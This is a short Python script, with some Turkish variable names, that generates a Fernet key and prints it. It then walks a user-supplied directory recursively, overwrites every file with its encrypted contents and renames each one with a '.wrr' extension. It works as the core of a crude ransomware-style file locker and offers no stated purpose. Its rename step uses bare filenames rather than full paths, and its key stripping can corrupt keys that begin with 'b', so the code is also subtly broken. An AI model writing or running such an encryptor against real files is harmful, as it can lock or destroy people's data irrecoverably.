import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
key = str(key).lstrip("b'").rstrip("'")
print("Your Key >>", key)
cipKey = Fernet(key)


def encryptt(files):
    with open(files, "rb") as rr:
        readFile = rr.read()
    with open(files, "wb") as ww:
        encccc = cipKey.encrypt(readFile)
        ww.write(encccc)



def filenc():
    a = input("Enter files path :")
    os.chdir(a)
    for path, bos, files in os.walk(os.getcwd()):
        for dosya in files:
            dosyaYolu = path + os.sep + dosya
            encryptt(dosyaYolu)
            os.renames(dosya, dosya + ".wrr")




filenc()
